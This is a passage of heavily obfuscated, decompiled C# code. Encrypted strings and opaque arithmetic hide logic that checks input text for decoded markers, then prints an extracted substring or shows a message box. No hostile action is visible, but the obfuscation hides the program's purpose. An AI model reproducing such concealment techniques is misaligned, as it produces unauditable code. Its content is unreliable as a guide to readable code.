		array12[(nint)((Array)(object)(char.ToString('\u0344') + char.ToString('\u0311') + "\u033b\u033c\u0306")).LongLength] = 33;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array12);
		array10[4] = string.Concat(text6, text7, text8 + text9 + string_6);
		_003CModule_003E.GetMaxByteCount(ref string_4, array10);
		if (text.Contains(string_4))
		{
			string text10 = char.ToString('鬻');
			string text11 = char.ToString((char)checked((Convert.ToInt32("1110011110100110000011100100100", 2) | MultiplyDoublingWideningScalarBySelectedScalarAndSubtractSaturate) - Convert.ToInt32("fff" + "6bc7e", 16)));
			string text12 = char.ToString('鬧');
			string text13 = char.ToString((char)(0xFFFCE74Eu ^ (uint)Convert.ToInt32("11111111111111000111110001101101", 2)));
			string string_7 = char.ToString('㎁') + char.ToString('㏈') + "㏝㏝";
			int num9 = _003CModule_003E.ActivityOptions[0];
			object[] array13 = new object[num9];
			array13[0 | (nint)((Array)(object)string.Empty).LongLength] = 41834;
			array13[1 * Convert.ToInt32("1", 16)] = char.ToString('ī') + "Ì\u0340";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array13);
			string string_8 = string.Concat(text10, text11, text12 + text13 + string_7);
			string string_9 = string.Concat(char.ToString('擧'), char.ToString('擧'), char.ToString('擧') + char.ToString('擢') + "擤撹撶撹");
			char c2 = (char)((Array)(object)"\u0323\u0354\u034e").Length;
			object[] array14 = new object[(uint)c2];
			array14[0] = checked(124667 - Convert.ToInt32("1895c", 16));
			array14[1] = (byte)(HashCode >> NumberGroupSizes) != 0;
			int num10 = ((Array)(object)"\u0342\u0320").Length;
			array14[num10] = char.ToString('օ') + "\\ā";
			_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array14);
			object[] array15 = new object[Convert.ToInt32(string_9, 16) - array6[Convert.ToInt32("6", _003CModule_003E.KeyValuePair__2[2])]];
			char c3 = (char)Convert.ToInt32("110011100011001", 2);
			int num11 = c3;
			int num13;
			if (num11 == (0x5978BA09 | (453706206 * Convert.ToInt32("37777777775", 8))))
			{
				int containsValue = ContainsValue;
				int num12 = default(int);
				switch (0 / Marshal.SizeOf(typeof(GetTime)))
				{
				case 0:
					num12 = -537754411;
					break;
				}
				num13 = containsValue | num12;
			}
			else
			{
				num13 = SAKA;
			}
			array15[num13] = (byte)((Array)(object)string.Empty).Length != 0;
			string string_10 = string.Concat(char.ToString('﨎'), char.ToString('降'), char.ToString('嗀') + "降禍");
			object[] array16 = new object[(nint)((Array)(object)(char.ToString('\u035a') + "\u031f\u0348")).LongLength];
			int num14 = array[1];
			array16[num14] = 4261;
			array16[1] = (byte)Convert.ToInt32("0", 16) != 0;
			char c4 = (char)Marshal.SizeOf(typeof(ENODATA));
			array16[(int)c4] = 59846;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array16);
			int num15 = Convert.ToInt32(string_10, 16);
			int num16 = ((FixedRotate > 585899) ? (array2[48] + -29226) : 19);
			int num17 = num15 >> num16;
			int num18 = ((-63872 == Convert.ToInt32("11111111111111101100111100110111", 2)) ? (-653890) : 921812);
			int num19;
			string string_11;
			checked
			{
				num19 = 16938 - num18;
				string_11 = string.Concat(char.ToString('ݻ'), "ݿݿ" + "ݿݼ" + "ݼݺݽݻݾݸ");
				object[] array17 = new object[2];
				array17[0] = 539;
				array17[1 * unchecked((nint)((Array)(object)"\u0330").LongLength)] = array2[8];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_11, array17);
			}
			array15[num17] = (char)checked(num19 - Convert.ToInt32(string_11, array[7]));
			array15[Marshal.SizeOf(typeof(GetMethodBody))] = 175255 % ((315323658 / LazyState) | 0x111C0);
			string string_12 = "鞜";
			object[] array18 = new object[Marshal.SizeOf(typeof(UnpackLow)) >> 11];
			array18[0] = 1466;
			array18[1] = 5027;
			array18[2] = Convert.ToInt32(char.ToString('3') + "2147", Convert.ToInt32("1000", 2));
			array18[3 * get_CurrencyGroupSeparator] = char.ToString((char)Convert.ToInt32("23a", 16)) + "\u07eb\u02ed";
			array18[Marshal.SizeOf(typeof(Stelem_Ref)) & 5] = (char)checked(Convert.ToInt32("411dd", 16) + -251141);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_12, array18);
			char num20 = array4[Convert.ToInt32(string_12, 16)];
			string text14 = char.ToString('\u0330');
			int num21 = ((Marshal.SizeOf(typeof(get_MajorRevision)) < -764522) ? 171710 : Marshal.SizeOf(typeof(get_Completion)));
			string text15 = char.ToString((char)num21);
			string string_13 = char.ToString('囅') + "囋囁";
			object[] array19 = new object[4];
			array19[0] = (byte)_003CModule_003E.ActivityOptions[1] != 0;
			array19[get_CurrencyGroupSeparator] = (char)Convert.ToInt32("10" + "0011010111", 2);
			array19[2] = checked(Convert.ToInt32("9c657", 16) - 638041);
			array19[_003CModule_003E.KeyValuePair__2[0]] = '䏵';
			_003CModule_003E.TAIWANLUNISOLAR(ref string_13, array19);
			array15[(uint)num20] = string.Concat(text14, text15 + string_13);
			string text16 = char.ToString((char)array2[9]);
			string string_14 = char.ToString('ᙈ') + "ᙄᘞ";
			object[] array20 = new object[(nint)((Array)(object)(char.ToString('\u036d') + "\u0329.\u031e\u0348")).LongLength];
			int num22 = ((_003CModule_003E.KeyValuePair__2[124] > AddDays) ? 460367 : 0);
			array20[num22] = (byte)array[2] != 0;
			array20[1] = false;
			char c5 = (char)((Array)(object)"\u031b\u0365").Length;
			array20[(uint)c5] = 361;
			array20[1 | Convert.ToInt32("2", 8)] = string.Concat(char.ToString((char)Convert.ToInt32("2", 16)), char.ToString('\b'), char.ToString('\0') + char.ToString('\u0001') + "\0\u0002");
			char c6 = (char)Convert.ToInt32("4", 16);
			array20[(int)c6] = array2[Convert.ToInt32("12", 8)];
			_003CModule_003E.TAIWANLUNISOLAR(ref string_14, array20);
			array15[(nint)((Array)(object)(text16 + string_14)).LongLength] = _003CModule_003E.LoadVector128[_003CModule_003E.KeyValuePair__2[125] * Convert.ToInt32("70161", 8) / 345702093];
			int num23 = ((16980 != Convert.ToInt32("100001001010100", 2)) ? (-103322) : 975898);
			array15[checked(unchecked(273616 - num23) - (Convert.ToInt32("11011000101" + "0000000010110001", ((Array)(object)"\u032f\u032a").Length) | (Convert.ToInt32("f92f13fb", 16) - -341014)))] = (char)(10418 >> (186718440 / Convert.ToInt32("30", 8) >> 21));
			_003CModule_003E.GetMaxByteCount(ref string_8, array15);
			if (text.Contains(string_8))
			{
				string string_15 = "⒰";
				object[] array21 = new object[Convert.ToInt32("2", 16) << Marshal.SizeOf(typeof(UseHebrewParsing))];
				int num24 = Convert.ToInt32("144", 16);
				array21[0] = num24;
				array21[1] = char.ToString(array[24]) + "\u001f$";
				array21[2] = array2[11];
				int num25 = ((Convert.ToInt32("11111111111111110101001100000100", 2) != -44284) ? _003CModule_003E.get_PositiveSign[130] : 3);
				array21[num25] = (byte)Convert.ToInt32("0", 2) != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_15, array21);
				string string_16 = string_15;
				string string_17 = string.Concat(char.ToString((char)Convert.ToInt32("f056", 16)), char.ToString('\uf057'), char.ToString('\uf004') + "\uf05d\uf054");
				int num26 = default(int);
				switch (checked(0 * MethodToken))
				{
				case 0:
					num26 = 6;
					break;
				case 1:
					num26 = -21422;
					break;
				}
				object[] array22 = new object[num26];
				char c7 = (char)Convert.ToInt32("0", 2);
				array22[(uint)c7] = false;
				array22[Marshal.SizeOf(typeof(UseHebrewParsing))] = string.Concat(char.ToString('忘'), char.ToString((char)Convert.ToInt32("1fa2", 16)), char.ToString('\u0098') + "ஃըĽ\u02c2");
				array22[array2[0]] = string.Concat(char.ToString('ດ'), char.ToString('w') + char.ToString('·') + "ľt\u0001\u0003");
				array22[(uint)array[(nint)((Array)(object)"\u0332\u0355\u0311\u036a").LongLength]] = 10479;
				array22[array2[49] + Convert.ToInt32("37776746726", 8)] = Marshal.SizeOf(typeof(get_Length));
				array22[checked(-7838 + CountDigits)] = 7534;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_17, array22);
				object[] array23 = new object[Convert.ToInt32(string_17, (62733 == Convert.ToInt32("11010011010010", 2)) ? Convert.ToInt32("1000001111111101011", 2) : 16) ^ (1037465 % array2[array2[40]])];
				string string_18 = string.Concat(char.ToString('꿈'), char.ToString('꿍'), char.ToString('꿉') + "꿋꿈꿋");
				object[] array24 = new object[(uint)array[3]];
				array24[0] = _003CModule_003E.get_PositiveSign[131] ^ Convert.ToInt32("fffa3d3c", 16);
				array24[Convert.ToInt32("1", _003CModule_003E.ActivityOptions[0])] = 10627;
				array24[2] = "\u0898㪰";
				array24[3] = string.Concat(char.ToString('ݐ'), char.ToString((char)Convert.ToInt32("1000011", 2)), char.ToString('Í') + char.ToString('ë') + "«\u001b\u0010");
				array24[4] = 10194;
				array24[Convert.ToInt32(char.ToString('1') + "01", Stream)] = false;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_18, array24);
				int num27;
				if (Convert.ToInt32(string_18, 8) > checked(969466 - Marshal.SizeOf(typeof(TupleElementNamesAttribute))))
				{
					string string_19 = string.Concat(char.ToString('궿'), char.ToString('궿'), char.ToString('궾') + "궾궺궾궿");
					object[] array25 = new object[checked(array2[38] * -1)];
					array25[get_PositiveInfinity] = char.ToString((char)array2[50]) + "௲\u17c6";
					array25[1] = 30085 % System_002EDiagnostics;
					array25[_003CModule_003E.ActivityOptions[0]] = Marshal.SizeOf(typeof(FloorScalar)) * 1;
					array25[3] = 1190592 >> (int)((Array)(object)"\u035e\u0308\u0342\u030a\u033f\u035b\u032e\u0311\u0316").LongLength;
					array25[4] = 2119;
					_003CModule_003E.TAIWANLUNISOLAR(ref string_19, array25);
					num27 = Convert.ToInt32(string_19, array[(uint)array[22]]);
				}
				else
				{
					string string_20 = "넪";
					object[] obj = new object[4] { 38828, null, null, null };
					char c8 = array[2];
					obj[(int)c8] = (byte)array2[1] != 0;
					obj[_003CModule_003E.ActivityOptions[Convert.ToInt32("0", 8)]] = 3481;
					obj[Convert.ToInt32("3", 16)] = char.ToString('ও') + "\u001fȣ";
					_003CModule_003E.TAIWANLUNISOLAR(ref string_20, obj);
					num27 = Convert.ToInt32(string_20, 8);
				}
				string text17 = char.ToString('4');
				int num28 = Convert.ToInt32("62", 8);
				string text18 = char.ToString((char)num28);
				string string_21 = char.ToString('큵') + "큵큲";
				object[] array26 = new object[3];
				int num29;
				checked
				{
					array26[669110 - Convert.ToInt32("10100011010110110110", 2)] = 49848;
					array26[_003CModule_003E.ActivityOptions[sizeof(char)]] = char.ToString('ɲ') + "b'";
					array26[2] = WriteAsync;
					_003CModule_003E.TAIWANLUNISOLAR(ref string_21, array26);
					array23[num27] = Convert.ToInt32(text17 + text18 + string_21, 8);
					num29 = (_003CModule_003E.ActivityOptions[116] & System_002EResources) + (-118204 ^ Convert.ToInt32("37777636064", 8));
				}
				array23[num29] = (char)(Range * (checked(_003CModule_003E.get_PositiveSign[132] - -782611) + -357951));
				string string_22 = "齏齎";
				object[] array27 = new object[10 % Convert.ToInt32("4", 8)];
				array27[array2[_003CModule_003E.ActivityOptions[2]]] = 3560;
				array27[_003CModule_003E.ActivityOptions[2]] = (char)(EventWaitHandle + SetDynamicBase);
				_003CModule_003E.TAIWANLUNISOLAR(ref string_22, array27);
				array23[Convert.ToInt32(string_22, (_003CModule_003E.get_PositiveSign[29] >= Convert.ToInt32("1111" + "11111" + "11101100000111000101001", 2)) ? Convert.ToInt32("10", 2) : 279102)] = (int)array4[(SumAbsoluteDifferences >= Convert.ToInt32(char.ToString('f') + char.ToString('f') + "f2dc1d", 16)) ? 6 : (_003CModule_003E.KeyValuePair__2[126] | -287832828)];
				int num30 = Marshal.SizeOf(typeof(ArrayListDebugView));
				int num32;
				if (75773 != Convert.ToInt32("431d31dc", 16) / 14860)
				{
					int num31 = Convert.ToInt32("37776224650", 8);
					num32 = num31;
				}
				else
				{
					num32 = __9__25_16;
				}
				array23[num30] = (char)(num32 & '८');
				_003CModule_003E.GetMaxByteCount(ref string_16, array23);
				int num33 = text.IndexOf(string_16);
				empty = text.Substring(num33 + checked((Convert.ToInt32("111" + "715415", 8) >> (5 & Convert.ToInt32("111", 2))) + unchecked(_003CModule_003E.ActivityOptions[19] * checked(_003CModule_003E.get_PositiveSign[133] * -1))));
				System.Console.WriteLine(empty);
			}
			else
			{
				string string_23 = "ứ";
				object[] array28 = new object[checked(205083 - array2[51])];
				int num34 = get_PositiveInfinity;
				char c9 = (char)Convert.ToInt32("cdbe", 16);
				array28[num34] = (char)(int)c9;
				array28[get_CurrencyGroupSeparator] = Convert.ToInt32(char.ToString('5') + "21", array[21]);
				int num35 = ((Array)(object)"\u036c\u0348").Length;
				array28[num35] = false;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_23, array28);
				string string_24 = string_23;
				object[] array29 = new object[(uint)array4[array6[4]]];
				array29[-129326 - (-120842 & Convert.ToInt32("111" + "11111111111101100011011011010", 2))] = array4[checked(-7 * Convert.ToInt32("37777777777", 8))];
				string string_25;
				object[] array30;
				checked
				{
					array29[~(_003CModule_003E.KeyValuePair__2[127] * 215) - -15669 * unchecked((int)array[11])] = UseDllDirectoryForDependencies;
					string_25 = string.Concat(char.ToString('궂'), char.ToString('궃'), "궃궂궃궂궃궃" + "궂궃궃궂궃궂궃궃궂궂궃");
					array30 = new object[4];
					array30[get_PositiveInfinity] = '߈';
				}
				char c10 = (char)((Array)(object)"\u034d").Length;
				array30[(uint)c10] = "䆎㧧";
				array30[Convert.ToInt32("10", 2)] = (byte)(Convert.ToInt32("77677", 16) + -489079) != 0;
				array30[(nint)((Array)(object)(char.ToString('\u033d') + "\u0355\u034d")).LongLength] = Convert.ToInt32(char.ToString('2') + char.ToString('a') + "76", Convert.ToInt32("10000", 2));
				_003CModule_003E.TAIWANLUNISOLAR(ref string_25, array30);
				array29[checked(Convert.ToInt32(string_25, 2) - WhenAllPromise__1)] = (array2[13] >> (Convert.ToInt32("1de8773", 16) >> Convert.ToInt32("15", 16))) ^ (1994605413 >> Marshal.SizeOf(typeof(LOG_EMERG)) % 32);
				int num36 = _003CModule_003E.LoadVector128[1];
				string string_26 = "\uf679\uf65f";
				object[] array31 = new object[3];
				array31[Convert.ToInt32("0", 8)] = false;
				array31[(AllocateSlot >= -959343) ? 1 : 30562] = RemoveRange;
				array31[2] = array2[Convert.ToInt32("16", 8)];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_26, array31);
				array29[num36] = string_26;
				char c11 = (char)checked(Marshal.SizeOf(typeof(IsValidText)) * 1);
				int num37 = c11;
				string text19 = char.ToString('3');
				string string_27 = "衘蠉";
				object[] array32 = new object[3 | _003CModule_003E.ActivityOptions[1]];
				array32[0] = "䠎\u0d4c";
				int num38 = Convert.ToInt32("1", ((Array)(object)"\u0323\u0322").Length);
				int num39 = default(int);
				switch (-373523 - Convert.ToInt32("11111111111110100100110011101100", 2))
				{
				case 0:
					num39 = -43674;
					break;
				case 1:
					num39 = 0;
					break;
				case 2:
					num39 = -16110;
					break;
				}
				array32[num38] = (byte)num39 != 0;
				array32[(nint)((Array)(object)"\u036b\u0325").LongLength] = 13024;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_27, array32);
				array29[num37] = Convert.ToInt32(text19 + string_27, array6[3]);
				array29[5] = (byte)(checked(_003CModule_003E.get_PositiveSign[31] * 8) - (Marshal.SizeOf(typeof(GCLargeObjectHeapCompactionMode)) | 0x3A4020A0) / (526 << Marshal.SizeOf(typeof(UseHebrewParsing)))) != 0;
				_003CModule_003E.GetMaxByteCount(ref string_24, array29);
				int num40 = text.IndexOf(string_24);
				empty = text.Substring(num40 + 1);
				string string_28 = "괘괳";
				object[] array33 = new object[2];
				array33[0 << PrivateScope] = (char)Convert.ToInt32(char.ToString('2') + "c37", 16);
				array33[(nint)((Array)(object)"\u0338").LongLength & 1] = ~Convert.ToInt32("fffff0a5", 16);
				_003CModule_003E.TAIWANLUNISOLAR(ref string_28, array33);
				string text20 = string_28;
				string string_29 = string.Concat(char.ToString('㜪'), char.ToString('㜬') + "㜤㜦");
				object[] array34 = new object[(nint)((Array)(object)(char.ToString('\u0331') + char.ToString('\u0311') + "\u0306\u032b\u0338")).LongLength];
				array34[0 * Convert.ToInt32("2530704", 8)] = 12047;
				int num41 = default(int);
				switch (checked(835092 - Convert.ToInt32("cbe12", 16)))
				{
				case 0:
					num41 = 998203;
					break;
				case 1:
					num41 = 738413;
					break;
				case 2:
					num41 = 1;
					break;
				case 3:
					num41 = -783429;
					break;
				}
				array34[num41] = false;
				array34[2] = 3872;
				array34[array2[53] - 234924] = _003CModule_003E.get_PositiveSign[134] + -823079;
				array34[4] = 4878;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_29, array34);
				string text21 = text20 + string_29;
				string string_30 = string.Concat(char.ToString('딋'), char.ToString('딂') + "땅딂");
				object[] array35 = new object[Convert.ToInt32("10", _003CModule_003E.ActivityOptions[0])];
				array35[0] = 5997;
				array35[array2[2] & 1] = array2[54] ^ 0xD26FD;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_30, array35);
				string text22 = string_30;
				string string_31 = string.Concat("\udadb\udad4" + "\udac6\uda92\udac4\udad3\udade", char.ToString('\udadb') + char.ToString('\udad6') + "\udadb\udac6\udacb\uda9c\uda9c\uda92\uda9c");
				object[] array36 = new object[4];
				nint num42;
				checked
				{
					array36[Convert.ToInt32("fffe8311", 16) - -97519] = '᳄';
					array36[Convert.ToInt32("1", Convert.ToInt32("1000", 2))] = string.Concat(char.ToString('i'), char.ToString('d') + "Qŵ");
					num42 = Marshal.SizeOf(typeof(ENODATA)) * unchecked((nint)((Array)(object)"\u034d").LongLength);
				}
				char c12 = (char)Convert.ToInt32("6c1", 16);
				array36[num42] = c12;
				array36[3] = 9824;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_31, array36);
				string string_32 = string.Concat(text21, text22 + string_31);
				object[] array37 = new object[array6[_003CModule_003E.KeyValuePair__2[4]] >> ((get_Precision >= 581451) ? (-781283) : set_PercentGroupSeparator) % Convert.ToInt32("32", sizeof(long))];
				char c13 = (char)(((-4357 == _003CModule_003E.KeyValuePair__2[128]) ? (-852005) : (-258122)) - array2[55] % -516244);
				int num43 = c13;
				int num44 = 0x3667F ^ Convert.ToInt32("37777240214", 8);
				int num45 = array2[56];
				string text23 = char.ToString((char)(num44 ^ num45));
				string text24 = char.ToString('Ϣ');
				string text25 = char.ToString('ಙ');
				string string_33 = char.ToString((char)array2[57]) + "㠂㲂";
				object[] array38 = new object[2];
				int num46 = (((nint)0 != (nint)((Array)(object)string.Empty).LongLength) ? (-26288) : 0);
				array38[num46] = (char)array2[15];
				array38[1] = string.Concat("Іʽ", char.ToString('κ') + char.ToString('\u0012') + " \u0001\u0016");
				_003CModule_003E.TAIWANLUNISOLAR(ref string_33, array38);
				array37[num43] = string.Concat(text23, text24 + text25 + string_33);
				int num47;
				if (checked(unchecked((int)array[_003CModule_003E.ActivityOptions[8]]) * Marshal.SizeOf(typeof(localtimeFilePath))) > -520906)
				{
					num47 = Convert.ToInt32(char.ToString('1') + "11" + "10111011111", 2) & 0x3FD6;
				}
				else
				{
					string string_34 = string.Concat(char.ToString((char)MemberTypes), char.ToString((char)_003CModule_003E.get_PositiveSign[135]), char.ToString('\ue4d3') + char.ToString('\ue483') + "\ue48d\ue48d\ue48d\ue484");
					object[] array39 = new object[Marshal.SizeOf(typeof(IsValidText))];
					array39[Convert.ToInt32("0", 16)] = 53889;
					array39[1] = Convert.ToInt32("21", 16);
					array39[_003CModule_003E.ActivityOptions[0]] = '\u008b';
					array39[3] = 4488;
					_003CModule_003E.TAIWANLUNISOLAR(ref string_34, array39);
					num47 = Convert.ToInt32(string_34, 16);
				}
				array37[1] = (char)num47;
				string string_35 = "Ⱕ";
				object[] array40 = new object[Convert.ToInt32(char.ToString('1') + "10", 2)];
				array40[(uint)array[1]] = false;
				array40[1] = 1082;
				array40[2] = "фƬ";
				array40[array2[_003CModule_003E.KeyValuePair__2[0]]] = "Нő";
				array40[Convert.ToInt32("4", 16)] = 5878;
				int num48 = LineNumberInfo - -534687;
				int num49 = array[25];
				array40[num48] = num49;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_35, array40);
				array37[(uint)array4[Convert.ToInt32(string_35, 8)]] = false;
				int num50;
				if (37166 > array2[16])
				{
					num50 = 87172;
				}
				else
				{
					int num51 = ((-21028 > Marshal.SizeOf(typeof(set_Message))) ? (-165477) : 276626350);
					num50 = num51;
				}
				int num52 = 829879050 / num50;
				string text26;
				checked
				{
					int num53 = array2[17] * unchecked(Convert.ToInt32("101100100111011101001111001000", 2) / array2[58]);
					string string_36 = string.Concat(char.ToString('Ȑ') + "ȑȑ", char.ToString('Ȑ') + char.ToString('Ȑ') + "ȐȐȐ", "ȑȑȐ" + "ȐȐȐȐȐȑȑȐ");
					_003CModule_003E.TAIWANLUNISOLAR(ref string_36, new object[2]
					{
						unchecked(223 * array[2]),
						string.Concat(char.ToString('\u0093'), char.ToString('\u0085') + char.ToString('&') + "\u0002\0\0\u0002")
					});
					array37[num52] = num53 + Convert.ToInt32(string_36, unchecked(Convert.ToInt32("fff111c4", 16) - -978494));
					_003CModule_003E.GetMaxByteCount(ref string_32, array37);
					text26 = string_32;
				}
				string text27 = char.ToString((char)Convert.ToInt32(char.ToString('a') + "e97", Marshal.SizeOf(typeof(PrepareDelegate))));
				int num54 = ((Convert.ToInt32("10110001101000110", 2) >= -351887) ? 44720 : 729823);
				string text28 = char.ToString((char)num54);
				string string_37 = "浉浏";
				object[] obj2 = new object[2] { '烠', null };
				char c14 = (char)array2[59];
				obj2[1] = (int)c14;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_37, obj2);
				string text29 = text27 + text28 + string_37;
				string string_38 = "幛帔";
				object[] array41 = new object[_003CModule_003E.get_PositiveSign[136] + -24859];
				array41[Convert.ToInt32("0", 16)] = array2[18];
				array41[array2[Marshal.SizeOf(typeof(ENODATA))]] = (char)_003CModule_003E.KeyValuePair__2[23];
				int num55 = 2 * sizeof(byte);
				int num56 = array[26];
				array41[num55] = num56;
				int num57 = ((Array)(object)"\u036f\u0305\u033f").Length;
				array41[num57] = string.Concat("\aɀ", char.ToString('\u0006') + char.ToString('j') + "\a\t");
				_003CModule_003E.TAIWANLUNISOLAR(ref string_38, array41);
				string text30 = string_38;
				string text31 = char.ToString((char)(EventIgnoreAttribute - _003CModule_003E.KeyValuePair__2[129]));
				string string_39 = string.Concat(char.ToString('ḹ'), char.ToString('Ḷ'), char.ToString('ḫ') + char.ToString('ḷ') + "ḵḯḹḪḽ");
				object[] array42 = new object[_003CModule_003E.get_PositiveSign[0]];
				array42[(nint)((Array)(object)string.Empty).LongLength] = "⽔俯";
				array42[1] = array2[60];
				array42[checked(2 * unchecked((nint)((Array)(object)"\u030a").LongLength))] = (byte)((uint)Convert.ToInt32("0", 2) & (true ? 1u : 0u)) != 0;
				array42[Convert.ToInt32("3", 16)] = (char)CorrelationHint;
				int num58 = Convert.ToInt32("4", 8);
				char c15 = (char)array2[61];
				array42[num58] = (char)(int)c15;
				array42[(uint)array[6]] = 4682 << _003CModule_003E.ActivityOptions[2];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_39, array42);
				string string_40 = string.Concat(text29, text30, text31 + string_39);
				string string_41 = "釻釻";
				object[] array43 = new object[array2[sizeof(int)]];
				int num59 = array2[1];
				char tYPEFLAG_FDISPATCHABLE = (char)TYPEFLAG_FDISPATCHABLE;
				array43[num59] = (int)tYPEFLAG_FDISPATCHABLE;
				array43[1] = ~Convert.ToInt32("11111111111111111111111111110010", 2);
				array43[_003CModule_003E.ActivityOptions[0]] = (byte)checked(_003CModule_003E.ActivityOptions[1] * -323800) != 0;
				array43[3] = checked(-791571 - array2[62]);
				array43[(14769 == MarkLabel) ? 966007 : 4] = Convert.ToInt32("100" + "0011010011011", array2[0]);
				_003CModule_003E.TAIWANLUNISOLAR(ref string_41, array43);
				object[] array44 = new object[Convert.ToInt32(string_41, 2)];
				int num60 = 880770 - 26690 * ((-9866 == _003CModule_003E.KeyValuePair__2[130]) ? 33 : array2[63]);
				string string_42 = "\udc46";
				object[] array45 = new object[Marshal.SizeOf(typeof(OverlappedData)) * array[2]];
				array45[0] = 48261;
				array45[array2[Marshal.SizeOf(typeof(ENODATA))]] = 715;
				array45[checked(array2[64] - 353445)] = Convert.ToInt32("d7ffc", 16) ^ 0xD7F80;
				array45[3] = ((Convert.ToInt32("37777600332", 8) < 303006) ? 1384 : (-89672));
				array45[array2[0] << 1] = "ሷԋ";
				_003CModule_003E.TAIWANLUNISOLAR(ref string_42, array45);
				array44[num60] = (byte)Convert.ToInt32(string_42, _003CModule_003E.LoadVector128[array2[0]]) != 0;
				array44[_003CModule_003E.Dequeue[0]] = 502;
				int num62;
				if (24708 < ((18901 * GetDllEntry < -529890) ? BeginExceptionBlock : (-391284)))
				{
					int num61 = Convert.ToInt32(char.ToString('f') + char.ToString('f') + "ffbfd5", GCHeapDumpKeyword);
					num62 = num61;
				}
				else
				{
					num62 = array6[5];
				}
				array44[num62] = 44259;
				_003CModule_003E.GetMaxByteCount(ref string_40, array44);
				string text32 = string_40;
				string string_43 = "痓";
				object[] array46 = new object[Convert.ToInt32("2", 16)];
				array46[get_PositiveInfinity] = (char)((uint)array[27] << 1);
				checked
				{
					array46[1] = Convert.ToInt32("475", 8) * unchecked((int)array[23]);
					_003CModule_003E.TAIWANLUNISOLAR(ref string_43, array46);
					int num63 = Convert.ToInt32(string_43, _003CModule_003E.KeyValuePair__2[5] & 0xC);
					int num64 = ~Tristate;
					MessageBox.Show(text26, text32, (MessageBoxButtons)num63, (MessageBoxIcon)(num64 >> 3));
				}
			}
			if (get_SchedulerPair.LogAlways(empty))
			{
				string text33 = char.ToString('\ueffd');
				int num65 = Convert.ToInt32("1110111111111101", 2);
				string text34 = char.ToString((char)num65);
				string string_44 = string.Concat("㮂㮵", "㮸㮽" + "㮰㯴㮺㮽㮠");
				object[] array47 = new object[5];
				array47[Convert.ToInt32("fff5b52f", 16) ^ -674513] = (char)(Convert.ToInt32("796e", 16) & '橦');
				array47[Marshal.SizeOf(typeof(Set)) / 1749903067] = 3742;
				int num66 = _003CModule_003E.ActivityOptions[0];
				char c16 = (char)Convert.ToInt32("54353", 8);
				array47[num66] = (int)c16;
				array47[Convert.ToInt32("3", 16)] = false;
				array47[4] = 'Д';
				_003CModule_003E.TAIWANLUNISOLAR(ref string_44, array47);
				string text35 = text33 + text34 + string_44;
				string string_45 = string.Concat("쑡쑼", char.ToString('쐳') + char.ToString('쑰') + "쑼쑷");
				object[] array48 = new object[5];
				int num67 = array[1];
				array48[num67] = array2[GetUtf8SequenceLength];
				array48[1] = "ޤÌ";
				array48[BigMul - _003CModule_003E.ActivityOptions[118]] = (byte)Convert.ToInt32("0", 2) != 0;
				int num68 = ((ReadAllBytes > -830512) ? 3 : (-952561));
				array48[num68] = (char)((uint)set_Type ^ 0x96BA2u);
				array48[4] = 6776;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_45, array48);
				string text36 = string_45;
				string string_46 = char.ToString((char)DivRem) + char.ToString('㠺') + "㡭㡻";
				object[] array49 = new object[sizeof(int)];
				array49[Convert.ToInt32("0", 8)] = '뤛';
				char c17 = (char)Convert.ToInt32("14570", 8);
				array49[1] = c17;
				array49[2] = "\u033dǽ";
				array49[3] = (byte)checked(552040 + Convert.ToInt32("11111111111101111001001110011000", 2)) != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_46, array49);
				string text37 = string_46;
				string string_47 = string.Concat(char.ToString('ꮤ') + "꯷ꮥ", "ꮲꮴꮲ" + "ꮾꮡꮲꮳ\uabfd\uabfd");
				object[] array50 = new object[2 << (int)((Array)(object)"\u0352").LongLength];
				array50[Convert.ToInt32("0", 8)] = 15587;
				array50[sizeof(bool)] = false;
				array50[Marshal.SizeOf(typeof(ENODATA))] = Convert.ToInt32("302ac3", 16) >> 11;
				array50[Convert.ToInt32("5319c828", 16) / Marshal.SizeOf(typeof(MustFlush))] = array2[20];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_47, array50);
				string string_48 = string.Concat(text35, text36 + text37 + string_47);
				string string_49 = "䗞";
				object[] array51 = new object[2];
				int num69 = ((PadLeft <= -903835) ? 335992 : 0);
				array51[num69] = "\u0357Ƽ";
				array51[1] = 16601;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_49, array51);
				string value = string_49;
				string string_50 = string.Concat(char.ToString('鶁'), char.ToString('鶀') + "鶀鶀");
				object[] array52 = new object[2];
				array52[0] = 15869;
				array52[373307173 / Convert.ToInt32("10110010000000011011100100101", 2)] = string.Concat(char.ToString('䃹'), char.ToString('ᄇ'), char.ToString('ڣ') + "ƭգ");
				_003CModule_003E.TAIWANLUNISOLAR(ref string_50, array52);
				object[] array53 = new object[Convert.ToInt32(value, Convert.ToInt32(string_50, Marshal.SizeOf(typeof(ENODATA))))];
				int num71;
				string string_52;
				object[] array55;
				int num72;
				char c18;
				checked
				{
					int num70 = default(int);
					switch (((array2[65] + -594069) | -6805695) + unchecked(Convert.ToInt32(char.ToString('2') + char.ToString('7') + "38e1", 16) % (Task_Start_Promise & 0xFB1FB)))
					{
					case 0:
						num70 = 958616;
						break;
					case 1:
					{
						string string_51 = string.Concat(char.ToString('䕂'), char.ToString('䔐') + "䕂䔓");
						object[] array54 = new object[Convert.ToInt32("3", 16)];
						array54[0] = ((Convert.ToInt32("1001011011100001", 2) <= 814005) ? 4597 : (-108147));
						array54[1] = "⍴\u0fbb";
						array54[Marshal.SizeOf(typeof(ENODATA)) * Convert.ToInt32("1", 2)] = unchecked((byte)(0 % get_IsNestedPublic)) != 0;
